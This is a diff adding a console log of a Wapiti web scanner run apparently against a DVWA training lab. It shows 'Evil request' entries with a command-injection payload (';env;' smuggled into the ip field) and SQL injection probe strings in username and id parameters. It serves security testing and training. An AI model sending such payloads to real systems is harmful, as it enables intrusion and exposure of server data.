@@ -1,0 +1,50 @@
+
+     __      __               .__  __  .__________
+    /  \    /  \_____  ______ |__|/  |_|__\_____  \ 
+    \   \/\/   /\__  \ \____ \|  \   __\  | _(__  <
+     \        /  / __ \|  |_> >  ||  | |  |/       \ 
+      \__/\  /  (____  /   __/|__||__| |__/______  /
+           \/        \/|__|                      \/
+Wapiti-3.0.3 (wapiti.sourceforge.io)
+[*] Saving scan state, please wait...
+
+ Note
+========
+This scan has been saved in the file /home/kali/.wapiti/scans/192.168.40.132_folder_cb2cffb6.db
+[*] Wapiti found 40 URLs and forms during the scan
+[*] Loading modules:
+	 mod_crlf, mod_exec, mod_file, mod_sql, mod_xss, mod_backup, mod_htaccess, mod_blindsql, mod_permanentxss, mod_nikto, mod_delay, mod_buster, mod_shellshock, mod_methods, mod_ssrf, mod_redirect, mod_xxe
+
+[*] Launching module exec
+---
+Command execution in http://192.168.40.132/dvwa/vulnerabilities/exec/ via injection in the parameter ip
+Evil request:
+    POST /dvwa/vulnerabilities/exec/ HTTP/1.1
+    Host: 192.168.40.132
+    Referer: http://192.168.40.132/dvwa/vulnerabilities/exec/
+    Content-Type: application/x-www-form-urlencoded
+
+    ip=%3Benv%3B&submit=submit
+---
+
+[*] Launching module sql
+---
+MySQL Injection in http://192.168.40.132/dvwa/vulnerabilities/brute/ via injection in the parameter username
+Evil request:
+    GET /dvwa/vulnerabilities/brute/?username=%C2%BF%27%22%28&password=Letm3in_&Login=Login HTTP/1.1
+    Host: 192.168.40.132
+    Referer: http://192.168.40.132/dvwa/vulnerabilities/brute/
+---
+---
+MySQL Injection in http://192.168.40.132/dvwa/vulnerabilities/sqli/ via injection in the parameter id
+Evil request:
+    GET /dvwa/vulnerabilities/sqli/?id=%C2%BF%27%22%28&Submit=Submit HTTP/1.1
+    Host: 192.168.40.132
+    Referer: http://192.168.40.132/dvwa/vulnerabilities/sqli/
+---
+
+[*] Launching module xss
+
+Report
+------
+A report has been generated in the file ./results/20210715/testing_full_attack/wapiti_20210715_053347.json
